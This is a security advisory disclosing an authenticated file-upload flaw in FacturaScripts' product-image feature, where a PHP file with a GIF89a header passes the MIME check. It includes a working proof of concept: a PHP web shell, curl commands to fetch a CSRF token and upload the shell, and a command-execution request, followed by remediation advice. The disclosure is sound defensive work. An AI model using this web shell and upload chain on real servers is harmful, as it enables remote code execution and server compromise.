# [M] FacturaScripts Vulnerable to Authenticated Remote Code Execution (RCE) via GIF Image Upload in Product Images

## Summary
Severity: Medium
Advisory: GHSA-vf3q-frmr-vrr9
CVE: CVE-2026-42879
CWE: CWE-434, CWE-94
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-vf3q-frmr-vrr9
Type: github-advisory

## Affected
- Packagist: `facturascripts/facturascripts` — affected >=0

## Details
# CVE-2026-42879 - FacturaScripts - Authenticated Unrestricted File Upload via MIME Type Bypass
 
## Summary
 
An authenticated unrestricted file upload vulnerability exists in FacturaScripts' product image upload functionality. An attacker with valid credentials can upload a PHP file disguised as a GIF image (using a GIF89a header), bypassing MIME type validation. The file is stored with its original extension, including executable extensions such as .php.
 
---
 
## Details
 
The vulnerability exists in:
 
`Core/Lib/ExtendedController/ProductImagesTrait.php`
 
Specifically in the `addImageAction()` method.
 
### Vulnerable Code
 
```php
if (false === strpos($uploadFile->getMimeType(), 'image/')) {
    Tools::log()->error('file-not-supported');
    continue;
}
 
$folder = Tools::folder('MyFiles');
Tools::folderCheckOrCreate($folder);
$uploadFile->move($folder, $uploadFile->getClientOriginalName());
```
 
### Root Cause
 
- The validation only checks if MIME type contains `"image/"`
- This can be bypassed by prepending **GIF89a magic bytes** to a PHP file
- The system incorrectly identifies the file as `image/gif`
- The file is saved with a `.php` extension in a web-accessible directory
 
### File Storage Behavior
 
Uploaded files are stored in:
 
```
/MyFiles/YYYY/MM/X.php
```
 
Where `X` is an auto-incrementing ID. This allows direct remote execution:
 
```
http://target/MyFiles/2026/03/2.php?cmd=id
```
 
---
 
## Impact
 
Successful exploitation:

An attacker may upload files with executable extensions (e.g. .php) to the server, which depending on server configuration could lead to further exploitation.
---
 
## Proof of Concept (Manual)
 
### Step 1: Create malicious file
 
```bash
cat > shell.jpg.php << 'EOF'
GIF89a
<?php
system($_GET['cmd']);
?>
EOF
```
 
### Step 2: Authenticate
 
- Login to the application
- Extract `PHPSESSID` from browser cookies
 
### Step 3: Get CSRF token
 
```bash
curl -s "http://target/EditProducto?code=CONTA621" \
  -H "Cookie: PHPSESSID=YOUR_SESSION_ID" \
  | grep -o 'multireqtoken\" value=\"[^\"]*\"' | cut -d'"' -f4
```
 
### Step 4: Upload shell
 
```bash
curl -X POST "http://target/EditProducto?code=CONTA621" \
  -H "Cookie: PHPSESSID=YOUR_SESSION_ID" \
  -F "multireqtoken=YOUR_CSRF_TOKEN" \
  -F "action=add-image" \
  -F "activetab=EditProductoImagen" \
  -F "idproducto=3" \
  -F "newfiles[]=@shell.jpg.php"
```
 
### Step 5: Execute command
 
```bash
curl "http://target/MyFiles/2026/03/2.php?cmd=id"
```
 
---

 
## Affected Products
 
| Field | Value |
|---|---|
| Ecosystem | Packagist |
| CVE ID | CVE-2026-42879 |
| Package Name | `facturascripts/facturascripts` |
| Affected Versions | <= 2025.81 |
| Patched Versions | Not yet patched |
| Fixed in | Pending |
 
---
 
## Remediation Recommendations
 
1. **Validate file extension** — reject any upload where the filename ends in `.php`, `.phtml`, `.phar`, or other executable extensions, regardless of MIME type
2. **Re-generate filenames on the server** — never use `getClientOriginalName()`; assign a safe UUID-based name with a validated extension
3. **Store uploads outside the webroot** — serve files through a controller that streams content, preventing direct URL execution
4. **Use a file type library** — validate actual file content (magic bytes + extension + MIME type) with a library like `fileinfo` rather than trusting client-supplied MIME
## Credits

- **Discoverer**: Abdullah Alwasabei / Guzrex

## References
- https://github.com/NeoRazorX/facturascripts/security/advisories/GHSA-vf3q-frmr-vrr9
- https://nvd.nist.gov/vuln/detail/CVE-2026-42879
- https://github.com/NeoRazorX/facturascripts
